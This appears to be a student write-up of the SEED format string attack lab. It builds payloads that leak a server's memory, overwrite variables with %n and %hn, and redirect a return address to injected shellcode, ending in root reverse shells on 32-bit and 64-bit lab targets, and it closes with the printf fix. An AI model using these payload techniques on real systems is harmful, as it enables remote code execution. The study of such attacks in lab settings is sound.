# Format String Attack Lab
- the `printf()` function in C is used to print out a string according to a format, its first argument is called *format* string, the format string uses placeholders marked by the `%` character, there are also other functions that use format string, `sprintf()`, `fprintf()`, `scanf()`
- some programs allow users to provide the entire or part of the contents in a format string, if such contents are not sanitized, attacker can use this opportunity to get the program to run arbitrary code, this problem is called **format string vulnerability**

- topics
    - format string vulnerability
    - code injection
    - stack layout
    - shellcode
    - reverse shell

- lab environment: `SEED Ubuntu 20.04 VM`

- the stack layout when call `printf("a=%d, b=%d", a, b)`
    ```
    High Memory Addresses
    |          +--------------------------+     
    |          |           ...            |
    |          +--------------------------+
    |          |            b             |
    |          |--------------------------| 
    |          |            a             |
    |          |--------------------------| 
    |          | address of format string |
    |          |--------------------------|
    |          |      return address      |
    |          |--------------------------|
    |          |     previous ebp/rbp     |
    |          |--------------------------|
    |          |           ...            |    
    |          +--------------------------+
    |          |       Unused Space       |
    |          +--------------------------+
    Low Memory Addresses
    ```
    - if we don't provide enough parameters, e.g., `printf("a=%d, b=%d", a)`, it will fetch the content from the position where `b` is supposed to be

## Setup
- turn off Address Space Layout Randomization:`sudo sysctl -w kernel.randomize_va_space=0` 
- compile server code (in the directory `Labsetup/server-code`)
    ```
    $ make
    [here will be a warning message]
    $ make install
    ```
- the warning message is generated by a countermeasure implemented in `gcc`, we can ignore it for now
- `-z execstack` option should be used in the compilation, for simplicity, non-executable stack countermeasure can be defeated using return-to-libc, there is a separate lab for return-to-libc

## Task 1: Crashing the Program
- target server `10.9.0.5`
- send a message to the server, we can see some information printed by the target container
    ```
    $ echo hello | nc 10.9.0.5 9090
    (Press Ctrl+C)
    ```
    ```
    server-10.9.0.5 | Got a connection from 10.9.0.1
    server-10.9.0.5 | Starting format
    server-10.9.0.5 | The input buffer's address:    0xffffd240
    server-10.9.0.5 | The secret message's address:  0x080b4008
    server-10.9.0.5 | The target variable's address: 0x080e5068
    server-10.9.0.5 | Waiting for user input ......
    server-10.9.0.5 | Received 6 bytes.
    server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd168
    server-10.9.0.5 | The target variable's value (before): 0x11223344
    server-10.9.0.5 | hello
    server-10.9.0.5 | The target variable's value (after):  0x11223344
    server-10.9.0.5 | (^_^)(^_^) Returned properly (^_^)(^_^)
    ```
- our goal for this task is to provide an input that makes the program crash (i.e., "Returned properly" is not printed out)
    - try `echo %s | nc 10.9.0.5 9090`
        ```
        ...
        server-10.9.0.5 | The target variable's value (before): 0x11223344
        (No more info printed out)
        ```
        - the program is crashed
## Task 2: Printing Out the Server Program's Memory
- target server `10.9.0.5`
- the objective of this task is to get the server to print out some data from its memory, the data will be printed out on the server side, so the attack cannot see it, but the technique used in this task will be essential for the subsequent tasks

### Task 2.A: Stack Data
- how many `%x` format specifiers do you need to get the program to print out the first four bytes of your input
    - we construct an input `"******** %s %s %s ... %s %x"`, to make it easier to find the first 4 bytes in the printout info of the server container, make the first 4 bytes `0x77777777`, construct the payload using a python program `task2A_payload.py`
    - the stack layout when calling `printf(msg)`
            ```
            High Memory Addresses
            |          +--------------------------+     
            |          |           ...            |
            |          +--------------------------+
            |          |        0x77777777        |
            |          |--------------------------| <---- address of input buffer 
            |          |           ...            |
            |          |--------------------------| 
            |          | address of input buffer  |
            |          |--------------------------| <---- first argument of printf()
            |          |      return address      |
            |          |--------------------------|
            |          |     previous ebp/rbp     |
            |          |--------------------------|
            |          |           ...            |    
            |          +--------------------------+
            |          |       Unused Space       |
            |          +--------------------------+
            Low Memory Addresses
            ```
    - when executing `printf()`, it will fetch a number of hexadecimal numbers from higher addresses, and if there is enough `%x` in the format string, it will finally fetch and print out the first 4 bytes in the input buffer, `0x77777777`
    - from the information printed out by the server, we can know the address of input buffer is `0xffffd240`, the frame pointer when in `myprintf()` is `0xffffd168`, so there will be **approximately** `216` bytes before reaching first 4 bytes of our input, each `%x` prints out 4 bytes, so the number of `%x` is around `54`, the precise number can be determined through experimentation, in my case, the number is `64`, and I can get the following output from the server (to make the output looks better, I acutally used `"%.8x"` in the payload)
        ```
        server-10.9.0.5 | wwww11223344 00001000 08049db5 080e5320 080e61c0 ffffd240 ffffd168 080e62d4 080e5000 ffffd208 08049f7e ffffd240 00000000 00000064 08049f47 080e5320 000005dc 000005dc ffffd240 ffffd240 080e9720 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 44371700 080e5000 080e5000 ffffd828 08049eff ffffd240 000005dc 000005dc 080e5320 00000000 00000000 00000000 ffffd8f4 00000000 00000000 00000000 000005dc 77777777 The target variable's value (after):  0x11223344
        server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
        ```

### Task 2.B: Heap Data
- there is a secret message (a string) stored in the heap area, and the server prints out its address, our objective is to print out this secrete message
    - te address of the secret message is `0x080b4008`, we need to place the address (in the binary form) of the secret message in the format string, if we still use `%x`, the container will only print out the address itself, not the content in that address, as the secret message is a string, use `%s`
    - in task `2.A`, we have already figured out the 64th placeholder specifier is for the first 4 bytes of our input, set this `%x` to `%s`
    - the output
        ```
        server-10.9.0.5 | wwww11223344 00001000 08049db5 080e5320 080e61c0 ffffd240 ffffd168 080e62d4 080e5000 ffffd208 08049f7e ffffd240 00000000 00000064 08049f47 080e5320 000005dc 000005dc ffffd240 ffffd240 080e9720 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 44371700 080e5000 080e5000 ffffd828 08049eff ffffd240 000005dc 000005dc 080e5320 00000000 00000000 00000000 ffffd8f4 00000000 00000000 00000000 000005dc A secret message
        server-10.9.0.5 | The target variable's value (after):  0x11223344
        server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
        ```

## Task 3: Modifying the Server Program's Memory
- target server `10.9.0.5`
- objective: modify the value of the target variable at `0x11223344`, we have 3 sub-tasks

### Task 3.A: Change the value to a different value
- use `%n`, it will write the length of the printout to a specified address, if we can do `3.B`, we can do `3.A`
### Task 3.B: Change the value to `0x5000`
- the address of `target` is `0x080e5068`
- use `%n`, to write `0x5000` to the target, we need to control the length of the output, we have already done this before with `%.8x`
- make a calculation: the output consists of 1 address (`4` bytes), 62 number of format `%.8x` (`62*8=496` bytes), the last part should be `0x5000-496-4=19980` bytes, i.e., `%.19980x`
- the target value (after) is indeed `0x5000`
    ```
    server-10.9.0.5 | ... The target variable's value (after):  0x00005000
    ```

### Task 3.C: Change the value to `0xAABBCCDD`
- if we use the method in the previous sub-task, the server will need to print out a very large number (`0xAABBCCDD`) of bytes, instead, we can use `%hn` (or `%hhn`) that writes only 2 bytes (or 1 bytes) of data at a given address
- use `%hn`, the payload looks like this: `<address><padding><address>%.8x%.8x...%.?x%hn%.?x%hn`
- since `0xAABB` is less than `0xCCDD`, the first `%hn` should write `0xAABB` to the higher 2 bytes of `target`, and the second `%hn` writes to the lower 2 bytes of `target`
- so, the first address should be `0x080e506a`, the second address should be `0x080e5068`, the padding can be any 4-byte value
- calculate the value of `?`
    - for the first `?`,it is `0xAABB-(62*8+3*4)=43199`
    - for the second `?`, it is `0xCCDD-0xAABB=8738`
- output
    ```
    server-10.9.0.5 | ... The target variable's value (after):  0xaabbccdd
    ```

## Task 4: Inject Malicious Code into the Server Program
- inject malicious code in binary format into the server's memory, and use the format string vulnerability to modify the return address field of a function, so when the function returns, it jumps to our injected code
- first, we need to know the address of the return address of `myprintf()`, it's `0xffffd16c`, there are 2 approaches to figure it out
    - approach 1
        - for `myprintf()`, the return address is pushed to the stack after the argument `msg` is pushed to the stack, and `msg` is the address of the input buffer `0xffffd240`, we can find multiple `0xffffd240` in the printout of the server in task `2.A`
        - the printout (I removed the first 4 bytes)
            ```
            11223344 00001000 08049db5 080e5320 080e61c0 ffffd240 ffffd168 080e62d4 080e5000 ffffd208 08049f7e ffffd240 00000000 00000064 08049f47 080e5320 000005dc 000005dc ffffd240 ffffd240 080e9720 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 44371700 080e5000 080e5000 ffffd828 08049eff ffffd240 000005dc 000005dc 080e5320 00000000 00000000 00000000 ffffd8f4 00000000 00000000 00000000 000005dc 77777777
            ```
        - analysis: there are several places that `0xffffd240` will be push to the stack
            - `main()` (3): as the argument of `printf()`, `fread()`, and `dummy()`
            - `dummy()`(1): as the argument of `myprintf()`
            - `myprintf()` (1): as the argument of `printf()`
        - the values are printed out from low to high addresses, so the second `0xffffd240` is the argument of `myprintf`, and the return address is `0x08049f7e`
        - from the printout we can calculate the distance between the second `0x08049f7e` and the address of input buffer, and then we can calculate the address of the return address: `0xffffd240-(4*53)=0xffffd16c`
    - approach 2 (easier, but require that the server prints out the value of `ebp` inside `myprintf()`)
        - the value of `ebp` is printed out by the server (it's `0xffffd168`), the return address should be `$ebp+4=0xffffd16c`

- then construct the payload, reuse the payload in task `3.C`, and append the shellcode, for convenience, put the shellcode in `[1000, len(shellcode)+1000]`, and the new return address can be `0xffffd240+1000`, it's ok to return to some bytes before this address, because we will fill those area with NOPs (`0x90`), here I used `0xffffd240+1000=0xffffd628`
    - we need to modify the value at address `0xffffd16c` to `0xffffd628`, specifically, modify the higher 2 bytes to `0xffff`, and the lower 2 bytes to `0xd628`
    - the core payload is 
        1. `0xffffd16c`
        2. `0x11111111` (padding, can be of any value)
        3. `0xffffd16c`
        4. `"%.8x"*62 + "%.54316x%hn%.10711x%hn"`
            - `54316 = 0xd628 - (62*8 + 3*4)`
            - `10711 = 0xffff - 0xd628`
- result
    ```
    $ ./exp32.py
    $ cat badfile | nc 10.9.0.1 9090
    ```
    ```
    $ nc -l 9875
    root@f83d0236bd7f:/fmt# <---- get a root shell
    ```

## Task 5: Attacking the 64-bit Server Program
- it would become a bit more complex to modify a 64-bit value, but we can still do it with more `%hn`
- the problem is that in `64-bit` addresses, the first 2 bytes are always `0x0000`, if we put the addresses at the beginning of the buffer, `printf()` will not print contents after the first `0x00`, the solution is to put them after all placeholders, and we need to use more `%lx` (for 64-bit values) to reach them

- first, we need to know with how many `%lx` we can get the first 8 bytes in the input buffer, just like task `2.A`, the answer is `34`

- get the address of return address, it's `0x00007fffffffe0b8` (`0x00007fffffffe0b0 + 0x8`, `0x00007fffffffe0b0` is the value of `rbp`)

- we can still put then shellcode in `[1000, len(shellcode)+1000]`, so the return address can be `0x00007fffffffe558` (`0x00007fffffffe170 + 1000`, `0x00007fffffffe170` is the address of input buffer)

- the format string is
    - `s = "%.16lx"*147 + "%.30415lx" + "%hn" + "%.25945lx" + "%hn" + "%.6823lx" + "%hn"`
- the addresses are stored after offset `920` in the buffer
- `920` is carefully selected, it ensures there is enough space for the format string (in my case, the length of `s` is `917` in bytes, but actually it is also easy to make it shorter, e.g., change `"%.16lx"*147` to `"%.32lx"*73 + "%.16lx"`)

- here is the layout of my input buffer in memory
    ```
    High Memory Addresses
    |      +--------------------------+
    |      |           ...            |
    |      +--------------------------+
    |      |        shellcode_64      |
    |      |--------------------------| <-- offset=1000
    |      |            NOPs          |
    |      |--------------------------| <-- offset=960
    |      |    0x00007fffffffe0b8    |
    |      |--------------------------| <-- offset=952
    |      |          padding         |
    |      |--------------------------| <-- offset=944
    |      |    0x111111119add1009    |
    |      |--------------------------| <-- offset=936
    |      |          padding         |
    |      |--------------------------| <-- offset=928
    |      |    0x00007fffffffe0bc    |
    |      |--------------------------| <-- offset=920
    |      |           ...            |
    |      |--------------------------|
    |      |       format string      |
    |      +--------------------------+ <-- offset=0
    |      |           ...            |
    |      +--------------------------+
    Low Memory Addresses
    ```

- result
    ```
    $ ./exp64.py
    $ cat badfile | nc 10.9.0.1 9090
    ```
    ```
    $ nc -l 9875
    root@a0349527f3e6:/fmt# <---- get a root shell
    ```

## Task 6: Fixing the Problem
- a straight forward fix for the problem is to modify `printf(msg)` to `printf("%s", msg)`